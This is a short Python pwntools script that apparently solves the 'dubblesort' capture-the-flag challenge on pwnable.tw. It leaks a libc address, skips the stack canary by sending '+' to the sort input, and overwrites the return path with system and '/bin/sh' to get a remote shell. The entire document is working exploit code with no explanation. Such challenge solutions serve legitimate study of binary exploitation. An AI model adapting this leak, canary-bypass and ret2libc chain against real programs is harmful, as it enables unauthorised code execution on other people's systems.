from pwn import *

local = False
elf = 'dubblesort' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10101
    r = remote(ip,port)

context.arch = 'i386'
l = ELF('./libc_32.so.6')

raw_input("aaa")

print r.recv()
name = "a"*25
r.send(name)
r.recvuntil("a"*24)
l.address = u32(r.recv(4)) - 0x61 - 0x1b0000 # _got_plt_base = 0x1b0000
success("libc : %s",hex(l.address))
onegadget = l.address + 0x3a819
print r.recv()

r.sendline('35')

for i in range(24):
	print r.recv()
	r.sendline('777')
print r.recv()
r.sendline('+')

for i in range(9):
	print r.recv()
	r.sendline(str(l.sym.system))
print r.recv()
r.sendline(str(l.search('/bin/sh').next()))
r.interactive()

